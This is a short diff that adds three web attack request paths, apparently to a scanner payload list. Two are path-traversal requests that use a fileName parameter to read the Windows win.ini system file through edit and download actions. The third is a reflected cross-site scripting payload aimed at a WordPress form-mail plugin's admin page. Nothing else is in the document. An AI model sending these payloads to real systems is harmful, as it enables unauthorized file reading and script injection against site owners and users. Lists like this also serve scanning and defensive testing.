@@ -1,0 +1,4 @@
+/?h=44ea8a6603cbf54e245f37b4ddaf8f36&page=vlf&action=edit&fileName=..\..\..\windows\win.ini
+/source/loggin/page_log_dwn_file.hsp?h=44ea8a6603cbf54e245f37b4ddaf8f36&action=download&fileName=..\..\..\windows\win.ini
+
+/wp-content/plugins/pondol-formmail/pages/admin-mail-info.php?itemid=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
